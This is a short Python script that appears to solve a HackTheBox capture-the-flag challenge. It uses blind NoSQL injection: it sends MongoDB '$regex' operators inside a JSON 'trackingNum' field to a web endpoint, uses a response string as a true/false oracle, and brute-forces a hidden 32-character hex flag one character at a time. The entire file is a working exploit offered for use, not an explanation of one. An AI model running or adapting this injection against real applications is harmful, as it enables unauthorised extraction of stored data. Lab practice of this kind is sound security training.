#! /usr/bin/env python3

import requests
import json

# Configuration
URL = "http://94.237.57.115:49238/index.php"
PROXY = {"http":"http://172.21.144.1:8081"}
HEADERS = {"Content-Type":"application/json"}

def oracle(t):
    r = requests.post(URL, headers=HEADERS, proxies=PROXY, data=json.dumps({"trackingNum": t}))
    return "bmdyy" in r.text

# assert (oracle("X") == False)
# assert (oracle({"$regex": "HTB{.*"}) == True)

trackingNum = "HTB{"
for _ in range(32):
    for c in "0123456789abcdef":
        if oracle({"$regex": trackingNum + c + ".*"}):
            trackingNum += c
            print(trackingNum)
            break
trackingNum += "}"
print("Final tracking number:", trackingNum)